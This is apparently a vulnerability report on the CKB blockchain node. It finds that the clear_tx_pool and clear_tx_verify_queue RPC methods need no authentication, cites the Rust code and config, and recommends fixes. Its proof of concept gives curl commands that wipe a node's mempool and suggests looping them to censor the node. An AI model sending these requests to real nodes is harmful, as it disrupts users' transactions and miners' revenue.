### Title
Unauthenticated `clear_tx_pool` and `clear_tx_verify_queue` RPC Methods Allow Any Caller to Wipe the Entire Mempool — (`File: rpc/src/module/pool.rs`)

### Summary

The `clear_tx_pool` and `clear_tx_verify_queue` RPC methods in the default-enabled `Pool` module perform complete mempool state-reset operations with zero access control. The CKB RPC server has no authentication mechanism at any layer — no API key, no token, no signature, no session credential. Any caller that can reach the RPC port can unconditionally wipe all pending and queued transactions from the node's mempool, directly analogous to the unrestricted `resetGame()` pattern in the reference report.

### Finding Description

**Root cause — no access control on destructive RPC methods:**

`clear_tx_pool()` in `rpc/src/module/pool.rs` (lines 684–692) directly calls `tx_pool.clear_pool(snapshot)` with no caller identity check of any kind:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
``` [1](#0-0) 

`clear_tx_verify_queue()` at lines 694–701 is identical in structure — no check before calling `tx_pool.clear_verify_queue()`: [2](#0-1) 

The downstream effect of `clear_pool` is total: it zeroes the `pool_map`, resets all counters, clears all caches, and resets the block assembler: [3](#0-2) 

**No authentication middleware in the RPC server:**

The RPC server in `rpc/src/server.rs` mounts only `CorsLayer::permissive()` and `TimeoutLayer` — there is no authentication middleware, no API-key check, no bearer token, and no IP allowlist enforced at the handler level: [4](#0-3) 

The `handle_jsonrpc` dispatcher dispatches every call directly to `io.handle_call(call, T::default())` with no credential extraction or validation: [5](#0-4) 

**`Pool` module is enabled by default in production:**

The default production module list in `resource/ckb.toml` includes `"Pool"`, which registers both `clear_tx_pool` and `clear_tx_verify_queue`: [6](#0-5) 

The `Pool` module is registered unconditionally when `pool_enable()` returns true: [7](#0-6) 

**Attacker-controlled entry path:**

1. Attacker identifies a CKB node with the RPC port reachable (localhost or network-exposed).
2. Sends a single unauthenticated HTTP POST: `{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}`.
3. The server dispatches directly to `PoolRpcImpl::clear_tx_pool`, which calls `TxPool::clear()` — wiping all pending, gap, and proposed transactions plus all caches.
4. Repeat at will; there is no rate limit or credential gate.

### Impact Explanation

**Impact: High**

- All pending transactions in the mempool are silently discarded. Users who submitted transactions must resubmit; transactions that were near confirmation are lost from the pool.
- The block assembler is reset (`BlockAssemblerMessage::Reset`), causing the next `get_block_template` call to return an empty template, directly harming miners' fee revenue.
- The attack is repeatable with zero cost — a single HTTP request per wipe cycle. An attacker can continuously clear the pool, preventing any transaction from accumulating enough to be mined, effectively censoring the node's mempool indefinitely.
- `clear_tx_verify_queue` additionally drops all transactions currently being verified, compounding the disruption.

### Likelihood Explanation

**Likelihood: High**

- The RPC binds to `127.0.0.1:8114` by default, but the CKB documentation explicitly acknowledges that operators commonly expose it to the network for remote management, and warns against it without providing any authentication mechanism to make safe exposure possible.
- Even in the localhost-only default configuration, any local process (co-hosted web service, malware, CI runner, container on the same host) can reach the port with no credentials.
- No authentication mechanism exists at any layer of the stack — there is nothing an operator can configure to restrict `clear_tx_pool` to authorized callers only.
- The `Pool` module is on by default; no special configuration is required to expose the attack surface.

### Recommendation

1. **Add an authentication layer to the RPC server** — an API token or HTTP Basic Auth credential checked in middleware before dispatching any call. The miner client already has `parse_authorization` logic for outbound requests; a symmetric inbound check is absent. [8](#0-7) 

2. **Move destructive state-mutation methods** (`clear_tx_pool`, `clear_tx_verify_queue`, `remove_transaction`) into a separate privileged module (e.g., `Admin`) that is **disabled by default**, mirroring how `IntegrationTest` and `Debug` are opt-in.

3. **At minimum**, document that enabling the `Pool` module on a network-reachable RPC port grants any caller the ability to wipe the mempool, and provide a supported mechanism to restrict it.

### Proof of Concept

```bash
# Wipe the entire mempool of a CKB node — no credentials required
curl -s -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"id":1,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Response: {"jsonrpc":"2.0","result":null,"id":1}

# Confirm mempool is empty
curl -s -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"id":2,"jsonrpc":"2.0","method":"tx_pool_info","params":[]}'
# pending: "0x0", proposed: "0x0", total_tx_size: "0x0"

# Also wipe the verification queue
curl -s -X POST http://127.0.0.1:8114 \
  -H "Content-Type: application/json" \
  -d '{"id":3,"jsonrpc":"2.0","method":"clear_tx_verify_queue","params":[]}'
```

The attack requires only HTTP access to the RPC port. No credentials, no keys, no privileged role. A loop around the first command continuously prevents any transaction from surviving long enough to be mined.

### Citations

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/pool.rs (L694-701)
```rust
    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** tx-pool/src/process.rs (L916-930)
```rust
    pub(crate) async fn clear_pool(&mut self, new_snapshot: Arc<Snapshot>) {
        {
            let mut tx_pool = self.tx_pool.write().await;
            tx_pool.clear(Arc::clone(&new_snapshot));
        }
        // reset block_assembler
        if self
            .block_assembler_sender
            .send(BlockAssemblerMessage::Reset(new_snapshot))
            .await
            .is_err()
        {
            error!("block_assembler receiver dropped");
        }
    }
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L218-260)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
    match req {
        Err(_error) => {
            let response = RpcResponse::from(
                Error::new(ErrorCode::ParseError),
                Some(jsonrpc_core::Version::V2),
            );

            serde_json::to_string(&response)
                .map(|json| {
                    (
                        [(axum::http::header::CONTENT_TYPE, "application/json")],
                        json,
                    )
                        .into_response()
                })
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
        }
        Ok(request) => match request {
            Request::Single(call) => {
                let result = io.handle_call(call, T::default()).await;

                if let Some(response) = result {
```

**File:** resource/ckb.toml (L189-193)
```text
# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```

**File:** rpc/src/service_builder.rs (L64-77)
```rust
    /// Mounts methods from module Pool if it is enabled in the config.
    pub fn enable_pool(
        mut self,
        shared: Shared,
        extra_well_known_lock_scripts: Vec<Script>,
        extra_well_known_type_scripts: Vec<Script>,
    ) -> Self {
        let methods = PoolRpcImpl::new(
            shared,
            extra_well_known_lock_scripts,
            extra_well_known_type_scripts,
        );
        set_rpc_module_methods!(self, "Pool", pool_enable, add_pool_rpc_methods, methods)
    }
```

**File:** miner/src/client.rs (L380-394)
```rust
fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
}
```
